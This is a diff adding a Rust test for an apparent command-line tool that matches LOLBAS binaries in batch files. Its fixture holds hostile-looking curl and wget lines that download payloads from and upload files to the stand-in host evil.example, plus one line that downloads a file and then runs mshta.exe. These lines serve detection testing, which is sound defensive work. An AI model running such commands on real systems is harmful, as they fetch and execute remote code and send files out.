@@ -1640,6 +1640,63 @@ fn summarize_lolbas_enrichment_ignores_program_names_in_curl_url_upload_metadata
 }
 
 #[test]
+fn summarize_lolbas_enrichment_ignores_program_names_in_downloader_short_metadata() {
+    let dir = TempDir::new().expect("tmp");
+    let input = dir.path().join("in.bat");
+    fs::write(
+        &input,
+        "curl -H mshta.exe http://evil.example/payload\r\n\
+         curl -T mshta.exe http://evil.example/upload\r\n\
+         wget -U mshta.exe http://evil.example/payload\r\n\
+         wget -i mshta.exe\r\n\
+         wget -P C:\\Temp\\mshta.exe http://evil.example/payload.bin\r\n\
+         curl -H Accept:*/* http://evil.example/payload && C:\\Temp\\mshta.exe\r\n",
+    )
+    .expect("write input");
+    let lolbas = dir.path().join("lolbas.json");
+    fs::write(
+        &lolbas,
+        r#"[
+          {
+            "Name": "Mshta.exe",
+            "url": "https://lolbas-project.github.io/lolbas/Binaries/Mshta/",
+            "Commands": [
+              {
+                "Category": "Execute",
+                "MitreID": "T1218.005"
+              }
+            ]
+          }
+        ]"#,
+    )
+    .expect("write lolbas");
+
+    let out = Command::cargo_bin("harrington")
+        .expect("bin")
+        .args([
+            "summarize",
+            input.to_str().expect("input path"),
+            "--lolbas-json",
+            lolbas.to_str().expect("lolbas path"),
+        ])
+        .assert()
+        .success()
+        .get_output()
+        .stdout
+        .clone();
+    let v: serde_json::Value = serde_json::from_slice(&out).expect("json");
+    let matches = v
+        .get("lolbas_matches")
+        .and_then(|v| v.as_array())
+        .expect("lolbas_matches array");
+    assert_eq!(matches.len(), 1, "unexpected matches: {matches:?}");
+    assert_eq!(
+        matches[0].get("command").and_then(|v| v.as_str()),
+        Some("C:\\Temp\\mshta.exe")
+    );
+}
+
+#[test]
 fn summarize_lolbas_enrichment_ignores_program_names_in_wget_metadata() {
     let dir = TempDir::new().expect("tmp");
     let input = dir.path().join("in.bat");
